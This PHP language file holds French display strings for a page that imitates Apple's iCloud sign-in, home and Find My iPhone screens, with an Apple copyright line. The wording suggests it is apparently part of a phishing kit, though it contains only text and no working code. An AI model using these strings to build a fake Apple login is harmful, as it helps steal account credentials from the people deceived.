<?php
/*
------------------
Language: Frensh
------------------
*/
 
$lang = array();
// Header
$lang['PAGE_TITLE'] = 'iCloud';
$lang['SETUP_INSTRUCTIONS'] = 'Comment configurer iCloud';
// login form
$lang['SIGN_IN_TITLE'] = 'Connexion à iCloud';
$lang['INCORRECT_ID'] = 'Votre ID ou mot de passe Apple était incorrect.';
$lang['APPLE_ID'] = 'Identifiant Apple';
$lang['PASSWORD'] = 'Mot de passe';
$lang['KEEP_ME'] = 'Rester connecté';
$lang['FORGOT_ID'] = 'Identifiant Apple ou mot de passe oublié ?';
$lang['DONT_HAVE_ID'] = 'Pas d’identifiant Apple ? ';
$lang['CREATE_YOURS'] = 'Créez le vôtre dès maintenant.';
// Footer
$lang['CHECK_ACTIVATION'] = 'État du verrouillage d’activation';
$lang['SYSTEM_STATUS'] = 'État du système';
$lang['POLICY'] = 'Engagement de confidentialité';
$lang['TERMS'] = 'Conditions générales';
$lang['COPYRIGHT'] = 'Copyright © 2017 Apple Inc. Tous droits réservés.';
// mobile version language
$lang['MOB_PAGE_TITLE'] = 'iCloud';
$lang['MOB_FIND'] = 'Localiser';
$lang['MOB_APPLE_ID'] = 'Identifiant Apple';
$lang['MOB_EXAMPLE'] = 'exemple@icloud.com';
$lang['MOB_PASSWORD'] = 'Mot de passe';
$lang['MOB_REQUIRED'] = 'requis';
$lang['MOB_LOGIN'] = 'Se connecter...';
$lang['MOB_FORGOT_ID'] = 'Id. Apple ou mot de passe oublié ?';
$lang['MOB_SETUP_INSTRUCTIONS'] = 'Instruction de configuration';
$lang['MOB_locating'] = 'Localisation...';
$lang['IDPWD_ERROR_ALERT1'] = 'Échec de la vérification';
$lang['IDPWD_ERROR_ALERT2'] = 'Votre identifiant Apple ou votre mot de passe est incorrect.';
$lang['IDPWD_ERROR_ALERT3'] = 'OK';
// Home Page
$lang['REMINDERS'] = 'Rappels';
$lang['NOTES'] = 'Notes';
$lang['ICLOUD_DRIVE'] = 'lecteur iCloud';
$lang['PHOTOS'] = 'Photos';
$lang['CONTACTS'] = 'Contacts';
$lang['MAIL'] = 'Courrier';
$lang['SETTINGS'] = 'Paramètres';
$lang['FIND_MY_IPHONE'] = 'Trouve mon iphone';
$lang['KEYNOTE'] = 'Keynote';
$lang['NUMBERS'] = 'Nombres';
$lang['FIND_FRIENDS'] = 'Trouver des amis';
$lang['PAGES'] = 'Pages';
// Find . php
$lang['ALL_DEVICES'] = 'Tous les dispositifs';
$lang['ICLOUD_SETTINGS'] = 'Paramètres iCloud';
$lang['SIGN_OUT'] = 'Se déconnecter';
$lang['LOCATE'] = 'Localisation ...';
$lang['ALL_DEVICES_OFFLINE'] = 'Tous les périphériques hors ligne';
$lang['NO_LOCO'] = 'Aucun emplacement ne peut être affiché car tous vos périphériques sont hors ligne.';
?>